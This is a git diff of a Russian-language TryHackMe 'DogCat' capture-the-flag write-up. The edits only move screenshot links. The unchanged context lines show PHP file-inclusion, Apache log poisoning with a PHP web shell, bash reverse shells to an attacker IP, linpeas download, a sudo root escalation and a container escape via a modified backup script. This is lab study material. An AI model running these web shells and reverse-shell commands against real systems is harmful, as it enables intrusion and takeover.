@@ -19,7 +19,7 @@ IP:10.10.138.40
 ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt:FFUZ -u http://10.10.138.40:80/FFUZ -ic -c
 ```
 
-![DogCat](https://raw.githubusercontent.com/GooseGusevich/Tryhackme/refs/heads/main/screenshots/20250419114939.png)
+![DogCat](https://raw.githubusercontent.com/GooseGusevich/Tryhackme/refs/heads/main/dogcat/screenshots/20250419114939.png)
 Используется функция include в php!
 https://www.php.net/manual/en/function.include.php
 FFUF
@@ -39,7 +39,7 @@ https://www.immuniweb.com/vulnerability/php-file-inclusion.html
 http://10.10.138.40/?view=php://filter/convert.base64-encode/resource=dog
 В данном случаи с помощью фильтра можем читать конечные файлы в base64
 ==php://filter/convert.base64-encode/resource=index.php==
-![DogCat](https://raw.githubusercontent.com/GooseGusevich/Tryhackme/refs/heads/main/screenshots/20250419114833.png)
+![DogCat](https://raw.githubusercontent.com/GooseGusevich/Tryhackme/refs/heads/main/dogcat/screenshots/20250419114833.png)
 
 ```
 echo "PGltZyBzcmM9ImRvZ3MvPD9waHAgZWNobyByYW5kKDEsIDEwKTsgPz4uanBnIiAvPg0K" | base64 -d
@@ -140,9 +140,9 @@ https://www.hackingarticles.in/apache-log-poisoning-through-lfi/
 <?php system($_GET['c']); ?>
 ```
 
-![DogCat](https://raw.githubusercontent.com/GooseGusevich/Tryhackme/refs/heads/main/screenshots/20250419184704.png)
+![DogCat](https://raw.githubusercontent.com/GooseGusevich/Tryhackme/refs/heads/main/dogcat/screenshots/20250419184704.png)
 
-![DogCat](https://raw.githubusercontent.com/GooseGusevich/Tryhackme/refs/heads/main/screenshots/20250419184815.png)
+![DogCat](https://raw.githubusercontent.com/GooseGusevich/Tryhackme/refs/heads/main/dogcat/screenshots/20250419184815.png)
 
 Реверс
 ```
@@ -153,9 +153,9 @@ bash -c 'bash -i &>/dev/tcp/10.11.134.170/1337 <&1'
 /?view=dog/../../../../var/log/apache2/access&ext=.log&c===bash -c 'bash -i %26>%2fdev%2ftcp%2f10.11.134.170%2f1337 <%261'%20==
 
 1 flag
-![DogCat](https://raw.githubusercontent.com/GooseGusevich/Tryhackme/refs/heads/main/screenshots/20250419185456.png)
+![DogCat](https://raw.githubusercontent.com/GooseGusevich/Tryhackme/refs/heads/main/dogcat/screenshots/20250419185456.png)
 2 flag на директории нижу 
-![DogCat](https://raw.githubusercontent.com/GooseGusevich/Tryhackme/refs/heads/main/screenshots/20250419185539.png)
+![DogCat](https://raw.githubusercontent.com/GooseGusevich/Tryhackme/refs/heads/main/dogcat/screenshots/20250419185539.png)
 
 скачаю linpeas проведу перечисление
 ```
@@ -169,12 +169,12 @@ curl http://10.11.134.170:80/linpeas.sh -o linpeas.sh && chmod +x linpeas.sh && 
 
 linpeas 
 Находимся в контейнере
-![DogCat](https://raw.githubusercontent.com/GooseGusevich/Tryhackme/refs/heads/main/screenshots/20250419190614.png)
+![DogCat](https://raw.githubusercontent.com/GooseGusevich/Tryhackme/refs/heads/main/dogcat/screenshots/20250419190614.png)
 
-![DogCat](https://raw.githubusercontent.com/GooseGusevich/Tryhackme/refs/heads/main/screenshots/20250419190725.png)
+![DogCat](https://raw.githubusercontent.com/GooseGusevich/Tryhackme/refs/heads/main/dogcat/screenshots/20250419190725.png)
 
 https://gtfobins.github.io/
-![DogCat](https://raw.githubusercontent.com/GooseGusevich/Tryhackme/refs/heads/main/screenshots/20250419191112.png)
+![DogCat](https://raw.githubusercontent.com/GooseGusevich/Tryhackme/refs/heads/main/dogcat/screenshots/20250419191112.png)
 
 www-data@325fa62d34e6:/tmp$ sudo env /bin/bash
 ==sudo env /bin/bash==
@@ -182,12 +182,12 @@ id
 uid=0(root) gid=0(root) groups=0(root)
 
 Выход из контейнера
-![DogCat](https://raw.githubusercontent.com/GooseGusevich/Tryhackme/refs/heads/main/screenshots/20250419193710.png)
-![DogCat](https://raw.githubusercontent.com/GooseGusevich/Tryhackme/refs/heads/main/screenshots/20250419193739.png)
+![DogCat](https://raw.githubusercontent.com/GooseGusevich/Tryhackme/refs/heads/main/dogcat/screenshots/20250419193710.png)
+![DogCat](https://raw.githubusercontent.com/GooseGusevich/Tryhackme/refs/heads/main/dogcat/screenshots/20250419193739.png)
 echo "#!/bin/bash" > /opt/backups/backup.sh
 echo "bash -i &>/dev/tcp/10.11.134.170/1338 <&1 " >> /opt/backups/backup.sh
 chmod +x /opt/backups/backup.sh
 /opt/backups/backup.sh
 
 4 flag
-![DogCat](https://raw.githubusercontent.com/GooseGusevich/Tryhackme/refs/heads/main/screenshots/20250419193459.png)
+![DogCat](https://raw.githubusercontent.com/GooseGusevich/Tryhackme/refs/heads/main/dogcat/screenshots/20250419193459.png)
